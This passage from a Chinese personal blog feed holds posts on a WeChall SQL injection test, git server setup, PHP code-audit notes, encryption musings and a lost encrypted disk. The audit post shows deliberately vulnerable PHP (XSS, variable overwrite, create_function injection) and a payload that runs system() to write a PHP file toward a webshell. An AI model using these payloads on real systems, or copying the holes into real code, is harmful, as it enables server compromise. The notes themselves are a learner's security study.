<p>最后, 我在想,, 这脚本有sqli? 怎么日? ….然后试了一下…果然有…<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#code.php?show=1%20union%20select%201%23</span></span><br><span class="line">Query: SELECT <span class="number">1</span> FROM `table` WHERE `id`=<span class="number">1</span> union select <span class="number">1</span><span class="comment">#</span></span><br><span class="line">SHOWING NUMBER <span class="number">1</span> union select <span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
<!--## 0x08 Stop us-->
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="/img/wechall.gif" alt="Wechall"><br>]]>
    
    </summary>
    
      <category term="Wechall" scheme="http://lazysheep.cc/tags/Wechall/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[git小记]]></title>
    <link href="http://lazysheep.cc/2015/07/22/0x04/"/>
    <id>http://lazysheep.cc/2015/07/22/0x04/</id>
    <published>2015-07-22T12:30:25.000Z</published>
    <updated>2015-10-15T01:08:20.667Z</updated>
    <content type="html"><![CDATA[<p><img src="/img/git.jpg" alt="GIT"><br><a id="more"></a></p>
<p>今天用git，把文件上传到服务器，然后下载下来，这些过了一遍。发现，在linux上git是最好用的。。。</p>
<p>git不像svn一样分服务端客户端，git在linux只需要一句命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install git</span><br></pre></td></tr></table></figure></p>
<p>之后，既可以做服务端，可以做客户端。</p>
<h1 id="服务端">服务端</h1><p>如果想使用git做服务端，第一步就是创建git用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo adduser git</span><br></pre></td></tr></table></figure>
<p>然后就是创建版本库了，比如，我准备把仓库<code>test</code>放在<code>/home/wwwroot/</code>下，则<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /home/wwwroot</span><br><span class="line">$ mkdir <span class="built_in">test</span></span><br><span class="line">$ sudo git init --bare <span class="built_in">test</span> </span><br><span class="line">$ sudo chown -R git:git <span class="built_in">test</span>    <span class="comment">#这句要在创建仓库后再使用</span></span><br></pre></td></tr></table></figure></p>
<p>这里有个要说明下，<code>--base</code> 参数是不把项目原文件放在仓库目录下，而是以另一种形式储存，也就是说，如果你把 <code>a.php</code> 文件上传到git仓库，则你在 <code>test</code> 文件夹中根本找不到 <code>a.php</code> 这个文件。</p>
<p>如果不加 <code>--bare</code> 参数，会出现一系列问题，现在我还没研究透，待我研究透侧了，再来补充。</p>
<p>这样服务端基本配置就好了，接下来就是客户端了。。</p>
<h1 id="附">附</h1><p>这里先假设一些东西，</p>
<blockquote>
<ol>
<li>服务器的ip是: 192.168.110.110</li>
<li>客户端1把项目储存在 ‘/home/wwwroot/default/test’ 目录下</li>
<li>把项目放在web服务器上 ‘/home/wwwroot/test.com’ 目录中，让外网访问<br>则</li>
</ol>
</blockquote>
<h1 id="客户端1">客户端1</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /home/wwwroot/default</span><br><span class="line">$ git <span class="built_in">clone</span> git@<span class="number">192.168</span>.<span class="number">110.110</span>:/home/wwwroot/<span class="built_in">test</span></span><br><span class="line">   <span class="comment"># 输入密码（免输入密码的方法我加在结尾的Other中）</span></span><br></pre></td></tr></table></figure>
<p>现在 <code>/home/wwwroot/default/test</code> 就是你的工作目录，或者可以把 <code>/test/.git</code>文件夹移到你的工作目录下。。</p>
<p>然后就是在有 <code>.git</code> 文件夹下，输入下面命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git add .                <span class="comment">#当前目录下的所以文件加入到版本库中，如果不像所有，可以 git add 具体文件</span></span><br><span class="line">$ git commit -m <span class="string">"这里你自己随便写"</span></span><br><span class="line">$ git push origin master</span><br></pre></td></tr></table></figure>
<p>上面这是在第一次提交文件，或者git仓库是空的情况下，假如是第二次提交，或者版本库中以有内容，则是。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git commit -am <span class="string">"自己随便写"</span></span><br><span class="line">$ git push origin master</span><br></pre></td></tr></table></figure>
<h1 id="web服务器">web服务器</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /home/wwwroot/test.com</span><br><span class="line">$ git <span class="built_in">clone</span> git@<span class="number">192.168</span>.<span class="number">110.110</span>:/home/wwwroot/<span class="built_in">test</span></span><br><span class="line"> <span class="comment"># 输入密码</span></span><br></pre></td></tr></table></figure>
<p>当客户端1的项目更新提交了后，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull origin master</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="Other">Other</h1><h2 id="免密码">免密码</h2><p>这里git文件传送使用的是ssh，所以其实也是ssh免输入密码的方式。<br>首先，编辑 <code>/etc/ssh/sshd_config</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ vim /etc/ssh/sshd_config</span><br><span class="line">AuthorizedKeysFile	.ssh/authorized_keys      <span class="comment">#这句前面的#号去了</span></span><br></pre></td></tr></table></figure>
<p>在客户端上使用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -P <span class="string">''</span></span><br><span class="line"> <span class="comment"># 则会在 ~/.ssh/ 目录下生产 id_rsa 和 id_rsa.pub..  这个就是传说中rsa加密的公钥和私钥</span></span><br></pre></td></tr></table></figure></p>
<p>把 <code>id_rsa.pub</code> 文件中的内容复制，粘贴到服务端 <code>~/.ssh/authorized_keys</code> 中</p>
<p><code>authorized_keys</code>文件的权限必须是644<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/.ssh</span><br><span class="line">$ ls -al</span><br><span class="line">-rw-r--r--. <span class="number">1</span> root root  authorized_keys</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="/img/git.jpg" alt="GIT"><br>]]>
    
    </summary>
    
      <category term="GIT" scheme="http://lazysheep.cc/tags/GIT/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[PHP代码审计小记]]></title>
    <link href="http://lazysheep.cc/2015/07/21/0x03/"/>
    <id>http://lazysheep.cc/2015/07/21/0x03/</id>
    <published>2015-07-21T15:01:39.000Z</published>
    <updated>2015-09-28T05:39:27.486Z</updated>
    <content type="html"><![CDATA[<p><img src="/img/php.jpg" alt="php"><br><a id="more"></a><br>代码部分来自 <a href="https://code.google.com/p/pasc2at/wiki/SimplifiedChinese" target="_blank" rel="external">https://code.google.com/p/pasc2at/wiki/SimplifiedChinese</a></p>
<h2 id="0x00_这种，现在应该没人会这么写吧？">0x00 这种，现在应该没人会这么写吧？</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="comment">//key.php?&lt;script&gt;alert(1);&lt;/script&gt;=1&amp;bbb=2</span></span><br><span class="line"><span class="comment">//print_R($_GET); </span></span><br><span class="line"> <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">AS</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$key</span>.<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="0x01_变量覆盖，并不懂为啥有人会这么写">0x01 变量覆盖，并不懂为啥有人会这么写</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="comment">//var.php?a=fuck      </span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">'hi'</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$a</span>;    <span class="comment">//输出fuck</span></span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="0x02_同样也是变量覆盖。。">0x02 同样也是变量覆盖。。</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//var.php?var=new</span></span><br><span class="line"><span class="variable">$var</span> = <span class="string">'init'</span>;                     </span><br><span class="line">parse_str(<span class="variable">$_SERVER</span>[<span class="string">'QUERY_STRING'</span>]);  <span class="comment">//$_SERVER['QUERY_STRING']的值为get参数</span></span><br><span class="line"><span class="comment">//parse_str(string,array) 设置变量的函数，array没设置就会覆盖已存在的变量</span></span><br><span class="line"><span class="keyword">print</span> <span class="variable">$var</span>;</span><br></pre></td></tr></table></figure>
<h2 id="0x03_代码执行漏洞">0x03 代码执行漏洞</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//how to exp this code</span></span><br><span class="line"><span class="variable">$sort_by</span>=<span class="variable">$_GET</span>[<span class="string">'sort_by'</span>];</span><br><span class="line"><span class="variable">$sorter</span>=<span class="string">'strnatcasecmp'</span>;</span><br><span class="line"><span class="variable">$databases</span>=<span class="keyword">array</span>(<span class="string">'test'</span>,<span class="string">'test'</span>);</span><br><span class="line"><span class="variable">$sort_function</span> = <span class="string">'  return 1 * '</span> . <span class="variable">$sorter</span> . <span class="string">'($a["'</span> . <span class="variable">$sort_by</span> . <span class="string">'"], $b["'</span> . <span class="variable">$sort_by</span> . <span class="string">'"]); '</span>;</span><br><span class="line">usort(<span class="variable">$databases</span>, create_function(<span class="string">'$a, $b'</span>, <span class="variable">$sort_function</span>));</span><br></pre></td></tr></table></figure>
<p>这个我研究了下, 有点屌啊~~</p>
<p>首先, 漏洞永远在于用户的可控点上, 所以上面的代码漏洞只可能存在于 <code>$sort_function = &#39;  return 1 * &#39; . $sorter . &#39;($a[&quot;&#39; . $sort_by . &#39;&quot;], $b[&quot;&#39; . $sort_by . &#39;&quot;]); &#39;;</code> 之中</p>
<p>payload:<br><code>sort_by=1&quot;],$b[&quot;2&quot;]) * system(&quot;echo &#39;&lt;?php phpinfo(); &#39; &gt; a.php &quot;);//</code></p>
<p>只要权限够, 就能写入一句话, 然后get webshell..</p>
<p>类似的函数还有:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">assert</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">call_user_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">call_user_func_array</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">create_function</span><span class="params">()</span></span></span><br><span class="line">变量函数</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="/img/php.jpg" alt="php"><br>]]>
    
    </summary>
    
      <category term="PHP" scheme="http://lazysheep.cc/tags/PHP/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[对于硬盘事件的随想]]></title>
    <link href="http://lazysheep.cc/2015/07/19/0x02/"/>
    <id>http://lazysheep.cc/2015/07/19/0x02/</id>
    <published>2015-07-19T14:38:44.000Z</published>
    <updated>2015-07-19T16:11:10.076Z</updated>
    <content type="html"><![CDATA[<p><img src="/img/brain.jpg" alt="brain"><br><a id="more"></a></p>
<p>加密最初的目的就是让数据更安全，可是经过这次事件，我认为，加密本身就是一件不安全的事情</p>
<hr>
<p>加密的功能不是让别人无法读取我的信息，而是让不知道密码的人读取到信息，系统并不能检测你是否是本人，只能知道你输入的密码是否正确。</p>
<p>  这就会导致一系列问题，比如，我把密码忘了，再比如，非法分子得到了我的密码。</p>
<p>  还有就是会跟我这次一样，加大了我修复分区的难度，假如我的那个重要的分区没有使用LUKS加密，那么我的分区就能修复，我的数据就不会丢失了。</p>
<hr>
<p>所以，就出现了现在的机器学习，支付宝9.0也是这个理念，取消图案解锁，让支付宝app去学习用户的行为，去辨认用户。但是，现在网络上大部分都是在喷支付宝的这个理念，我觉得根本就是因为支付宝技术上还没达到，就把这个理念拿出来实施了。</p>
<p>我认为支付宝技术上还没达到的原因，一，就是网络上很多人对支付宝的测试，支付宝9.0没法通过用户的行为识别用户，二，就是我觉得，如果支付宝真的达到能让app自己去识别用户的水平，那么就会把所有密码取消掉了（至少留个登录密码，甚至连登录密码也不需要。），而不是现在只取消了图案解锁。</p>
<p>所以我认为，机器学习应该就是现在的主流。。</p>
<hr>
<p>但是我觉得机器学习还不够，我认为最好的方案就是人工智能，机器能像人一样思考，而不是分析海量的数据。</p>
<p>就比如，你去见你爸，一眼你就可以知道他是不是你爸爸，而不是需要他说一串密码，然后你进行确认，也不用去分析他的各种行为来进行确认。</p>
<p>而人工智能引发的什么人类危机就不属于我考虑的范围了，我估计人工智能要等到下一次革命，不知道我能不能看到。</p>
<hr>
<p>PS: 以上只是无聊时的突发奇想而已。。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="/img/brain.jpg" alt="brain"><br>]]>
    
    </summary>
    
      <category term="随笔" scheme="http://lazysheep.cc/tags/%E9%9A%8F%E7%AC%94/"/>
    
      <category term="S-essay" scheme="http://lazysheep.cc/categories/S-essay/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[对于这次硬盘坏掉事件小记]]></title>
    <link href="http://lazysheep.cc/2015/07/19/0x01/"/>
    <id>http://lazysheep.cc/2015/07/19/0x01/</id>
    <published>2015-07-18T17:17:46.000Z</published>
    <updated>2015-07-19T14:45:11.829Z</updated>
    <content type="html"><![CDATA[<p><img src="/img/jian.jpg" alt="图片"><br><a id="more"></a></p>
<h2 id="起因">起因</h2><p>  强行拔移动硬盘。导致分区损坏。无法挂载。</p>
<hr>
<h2 id="Then">Then</h2><p>  就花了几天时间研究怎么修复，因为我很多重要的东西都放在移动硬盘上，就比如这个博客，还有我写的py脚本。。还有很多视频，文档之类的。<br>期间研究了有win上的分区修复软件。也有linux上的。因为硬盘有1TB。比较大，一次扫描就花了我很长时间</p>
<hr>
<h2 id="Final">Final</h2><p>  我硬盘上分了两个NTFS分区，成功恢复，文件没丢失，在移动硬盘上装了一个kali，一个backbox，也成功恢复，没有丢失，。。。。<br>  可是，这些都没有特别重要的东西。。。最重要的是，我分了一个ext4 + LUKS 分区，重要的文件（代码，博客）,全存在这了。。。。恢复失败。。。</p>
<hr>
<h2 id="Now">Now</h2><p>  我现在还是太年轻了，无法修复，，所以，，备份完之后，，，把硬盘格了，，以前的博客没法更新了。。所以我花了一晚重新搭博客，，本来是准备把博文一篇一篇从html手工转为md的。。。。<br>  不过我突发奇想，在md中加入了js跳转，这样我在新建一个站点，以前的站点就不用了，挂到子域名下：<a href="http://old.lazysheep.cc" target="_blank" rel="external">http://old.lazysheep.cc</a></p>
<p>  下面一篇博文是传送门，点进去后会直接跳转到我前面的文章。。。。</p>
<h2 id="Review">Review</h2><p>  对于这次事件，做一个检讨。。。</p>
<blockquote>
<ul>
<li>没有做好备份工作。。。撸代码首先就是要学会备份，学会备份，学会备份。。。重要的事说三遍。。。。而我现在还是没养成备份的好习惯。。。。</li>
<li>我又不是什么重要的人，也没什么重要的东西。。。别作死的搞LUKS……NTFS的我恢复了。。ext4的我也恢复了。。。。可是LUKS + ext4的就恢复不了。。。。如果我不作死的给这个分区加密。。。。早就恢复好了。。。</li>
<li>事实证明。。没弹出USB设备进行强拔。。是会出问题的。会出问题的。出问题的。。。。。。。</li>
</ul>
</blockquote>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="/img/jian.jpg" alt="图片"><br>]]>
    
    </summary>
    
      <category term="检讨" scheme="http://lazysheep.cc/tags/%E6%A3%80%E8%AE%A8/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[跳转到以前的博文]]></title>
    <link href="http://lazysheep.cc/2015/07/19/0x00/"/>
    <id>http://lazysheep.cc/2015/07/19/0x00/</id>
    <published>2015-07-18T17:17:45.000Z</published>
    <updated>2015-07-19T14:45:06.461Z</updated>
    <content type="html"><![CDATA[<p><img src="/img/jump.png" alt="jump"><br><a id="more"></a></p>
<script>window.location.href="http://old.lazysheep.cc"</script>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="/img/jump.png" alt="jump"><br>]]>
    
    </summary>
    
      <category term="Old博文" scheme="http://lazysheep.cc/tags/Old%E5%8D%9A%E6%96%87/"/>
    
      <category term="R-porter" scheme="http://lazysheep.cc/categories/R-porter/"/>
    
  </entry>
  
</feed>